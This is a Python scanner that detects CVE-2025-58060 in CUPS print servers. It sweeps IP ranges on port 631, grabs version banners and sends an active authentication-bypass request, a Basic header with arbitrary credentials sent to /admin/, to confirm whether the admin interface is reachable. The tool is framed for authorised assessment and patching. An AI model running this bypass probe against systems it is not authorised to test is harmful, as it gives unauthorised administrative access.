#!/usr/bin/env python3
"""
cups_detector.py — CVE-2025-58060 Detection Tool
Performs version detection AND active auth bypass probe against CUPS instances.

Usage:
  python3 cups_detector.py                        # check localhost
  python3 cups_detector.py 192.168.1.10           # check single host
  python3 cups_detector.py 192.168.1.0/24         # scan subnet
  python3 cups_detector.py 192.168.1.1-20         # scan IP range

"""

import subprocess
import sys
import socket
import http.client
import ipaddress
import base64
import argparse
from datetime import datetime

# ── Constants ────────────────────────────────────────────────────────────────
VULNERABLE_VERSION  = (2, 4, 13)       # first patched release
CUPS_PORT           = 631
TIMEOUT             = 4                # seconds per connection attempt
ADMIN_PATH          = "/admin/"
BYPASS_CREDENTIALS  = "exploit:exploit" # arbitrary — credentials don't matter

class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def red(s):    return f"{C.RED}{s}{C.RESET}"
def green(s):  return f"{C.GREEN}{s}{C.RESET}"
def yellow(s): return f"{C.YELLOW}{s}{C.RESET}"
def cyan(s):   return f"{C.CYAN}{s}{C.RESET}"
def bold(s):   return f"{C.BOLD}{s}{C.RESET}"


def get_local_cups_version():
    """Read CUPS version from the local system via cups-config."""
    try:
        result = subprocess.run(
            ["cups-config", "--version"],
            capture_output=True,
            text=True
        )
        version_str = result.stdout.strip()
        return tuple(map(int, version_str.split(".")))
    except FileNotFoundError:
        return None
    except ValueError:
        return None


def is_version_vulnerable(version_tuple):
    """Return True if the version tuple is below the patched threshold."""
    return version_tuple < VULNERABLE_VERSION


# ── Network helpers ───────────────────────────────────────────────────────────
def is_cups_port_open(host, port=CUPS_PORT, timeout=TIMEOUT):
    """Quick TCP connect check to see if CUPS port is reachable."""
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def get_remote_cups_version(host, port=CUPS_PORT, timeout=TIMEOUT):
    """
    Attempt to read CUPS version from the HTTP Server header or
    the /version page exposed by the CUPS web interface.
    Returns a version tuple or None if not detectable.
    """
    try:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        conn.request("GET", "/", headers={"Host": f"{host}:{port}"})
        resp = conn.getresponse()
        server_header = resp.getheader("Server", "")
        conn.close()

        # Server header often looks like: CUPS/2.4.10 IPP/2.1
        if "CUPS/" in server_header:
            version_str = server_header.split("CUPS/")[1].split(" ")[0]
            return tuple(map(int, version_str.split(".")))
    except Exception:
        pass
    return None


# ── Core exploit probe ────────────────────────────────────────────────────────
def probe_auth_bypass(host, port=CUPS_PORT, timeout=TIMEOUT):
    """
    Attempt the CVE-2025-58060 authentication bypass by sending a Basic
    Authorization header to the CUPS admin endpoint.

    On a VULNERABLE system: returns HTTP 200 (admin page served without auth)
    On a PATCHED system:    returns HTTP 401 (unauthorized) or HTTP 403

    Returns a dict with keys: status_code, server_header, vulnerable, error
    """
    result = {
        "status_code":   None,
        "server_header": None,
        "vulnerable":    False,
        "error":         None,
    }

    try:
        # Build the crafted Basic Authorization header
        # Credentials are arbitrary — the bug is the TYPE check is skipped
        encoded = base64.b64encode(BYPASS_CREDENTIALS.encode()).decode()
        headers = {
            "Host":          f"{host}:{port}",
            "Authorization": f"Basic {encoded}",
            "User-Agent":    "Mozilla/5.0 (CVE-2025-58060 detector)",
        }

        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        conn.request("GET", ADMIN_PATH, headers=headers)
        resp = conn.getresponse()

        result["status_code"]   = resp.status
        result["server_header"] = resp.getheader("Server", "unknown")

        # Vulnerable systems serve the admin page (200) or redirect (301/302)
        # Patched systems return 401 Unauthorized
        if resp.status in (200, 301, 302):
            result["vulnerable"] = True
        elif resp.status == 401:
            result["vulnerable"] = False

        conn.close()

    except socket.timeout:
        result["error"] = "timeout"
    except ConnectionRefusedError:
        result["error"] = "connection refused"
    except Exception as e:
        result["error"] = str(e)

    return result


# ── Single host scan ──────────────────────────────────────────────────────────
def scan_host(host):
    """
    Full assessment of a single host:
      1. TCP port check
      2. Version banner grab
      3. Active auth bypass probe
    Returns a result dict.
    """
    result = {
        "host":            host,
        "port_open":       False,
        "version":         None,
        "version_vuln":    None,
        "bypass_status":   None,
        "bypass_vuln":     None,
        "server_header":   None,
        "error":           None,
        "timestamp":       datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }

    # Step 1: port check
    if not is_cups_port_open(host):
        result["error"] = f"Port {CUPS_PORT} closed or filtered"
        return result
    result["port_open"] = True

    # Step 2: version grab
    version = get_remote_cups_version(host)
    if version:
        result["version"]      = ".".join(map(str, version))
        result["version_vuln"] = is_version_vulnerable(version)

    # Step 3: active auth bypass probe
    probe = probe_auth_bypass(host)
    result["bypass_status"] = probe["status_code"]
    result["bypass_vuln"]   = probe["vulnerable"]
    result["server_header"] = probe["server_header"]
    if probe["error"]:
        result["error"] = probe["error"]

    return result


# ── IP range parsers ──────────────────────────────────────────────────────────
def parse_targets(target_str):
    """
    Accept:
      - 'localhost' or a single IP
      - CIDR notation: 192.168.1.0/24
      - Dash range:    192.168.1.1-20
    Returns a list of host strings.
    """
    if target_str == "localhost":
        return ["127.0.0.1"]

    # Dash range: 192.168.1.1-20
    if "-" in target_str and "/" not in target_str:
        parts = target_str.rsplit("-", 1)
        base  = parts[0]
        end   = int(parts[1])
        prefix = ".".join(base.split(".")[:-1])
        start  = int(base.split(".")[-1])
        return [f"{prefix}.{i}" for i in range(start, end + 1)]

    # CIDR
    try:
        network = ipaddress.ip_network(target_str, strict=False)
        # Skip network and broadcast for /24 and larger
        hosts = list(network.hosts())
        return [str(h) for h in hosts]
    except ValueError:
        pass

    # Single host / hostname
    return [target_str]


# ── Report printer ────────────────────────────────────────────────────────────
def print_result(r):
    host = r["host"]
    print(f"\n{'─'*55}")
    print(bold(f"  Target: {host}:{CUPS_PORT}"))
    print(f"{'─'*55}")

    if not r["port_open"]:
        print(yellow(f"  [~] {r['error']}"))
        return

    # Version line
    if r["version"]:
        vuln_tag = red("VULNERABLE") if r["version_vuln"] else green("PATCHED")
        print(f"  [i] CUPS version  : {r['version']} [{vuln_tag}]")
    else:
        print(yellow("  [~] Version       : could not detect from banner"))

    # Server header
    if r["server_header"]:
        print(f"  [i] Server header : {r['server_header']}")

    # Auth bypass probe
    if r["bypass_status"] is not None:
        status_str = f"HTTP {r['bypass_status']}"
        if r["bypass_vuln"]:
            print(red(  f"  [!] Auth bypass   : {status_str} — ACCESS GRANTED (VULNERABLE)"))
            print(red(  f"  [!] CVE-2025-58060 CONFIRMED — admin interface accessible without valid credentials"))
        else:
            print(green(f"  [✓] Auth bypass   : {status_str} — access denied (PATCHED)"))
    elif r["error"]:
        print(yellow(f"  [~] Probe error   : {r['error']}"))

    print(f"  [t] Scanned at    : {r['timestamp']}")


def print_summary(results):
    total     = len(results)
    open_     = sum(1 for r in results if r["port_open"])
    vuln      = sum(1 for r in results if r["bypass_vuln"])
    patched   = sum(1 for r in results if r["port_open"] and not r["bypass_vuln"] and r["bypass_status"])

    print(f"\n{'═'*55}")
    print(bold("  SCAN SUMMARY"))
    print(f"{'═'*55}")
    print(f"  Hosts scanned    : {total}")
    print(f"  CUPS found       : {open_}")
    print(red(  f"  VULNERABLE       : {vuln}") if vuln else f"  VULNERABLE       : {vuln}")
    print(green(f"  PATCHED          : {patched}"))
    print(f"{'═'*55}\n")

    if vuln:
        print(red(bold("  ⚠  RECOMMENDED ACTION:")))
        print("     Update CUPS to version 2.4.13 or later on all")
        print("     vulnerable hosts and restrict access to port 631.")
    else:
        print(green("  ✓  No vulnerable CUPS instances detected."))
    print()


# ── Local check ───────────────────────────────────────────────────────────────
def check_local():
    print(bold("\n[*] Checking local CUPS installation..."))
    version = get_local_cups_version()

    if version is None:
        print(yellow("  [~] cups-config not found — CUPS may not be installed locally."))
        print(yellow("  [~] Use a target IP/subnet to scan remote hosts.\n"))
        return

    ver_str = ".".join(map(str, version))
    if is_version_vulnerable(version):
        print(red(  f"  [!] Local CUPS version : {ver_str}"))
        print(red(  f"  [!] Status             : VULNERABLE to CVE-2025-58060"))
        print(red(  f"  [!] {version} < {VULNERABLE_VERSION}"))
        print(yellow(f"  [>] Update to CUPS >= 2.4.13 immediately.\n"))
    else:
        print(green(f"  [✓] Local CUPS version : {ver_str}"))
        print(green(f"  [✓] Status             : NOT vulnerable\n"))


# ── Entry point ───────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-58060 CUPS Authentication Bypass Detector",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__
    )
    parser.add_argument(
        "target", nargs="?", default=None,
        help="IP address, hostname, CIDR (192.168.1.0/24), or range (192.168.1.1-20). "
             "Omit to check local system only."
    )
    args = parser.parse_args()

    print(bold(cyan("\n╔══════════════════════════════════════════════════════╗")))
    print(bold(cyan(  "║   CVE-2025-58060 — CUPS Auth Bypass Detector        ║")))
    print(bold(cyan(  "║   For authorized security assessment use only        ║")))
    print(bold(cyan(  "╚══════════════════════════════════════════════════════╝")))

    # Always check local first
    check_local()

    if not args.target:
        print("  Tip: pass a target IP or subnet to probe remote hosts.")
        print("  Example: python3 cups_detector.py 192.168.1.0/24\n")
        return

    targets = parse_targets(args.target)

    if len(targets) > 1:
        print(bold(f"[*] Scanning {len(targets)} hosts on port {CUPS_PORT}...\n"))
    else:
        print(bold(f"[*] Probing {targets[0]}:{CUPS_PORT}...\n"))

    results = []
    for host in targets:
        r = scan_host(host)
        print_result(r)
        results.append(r)

    if len(results) > 1:
        print_summary(results)


if __name__ == "__main__":
    main()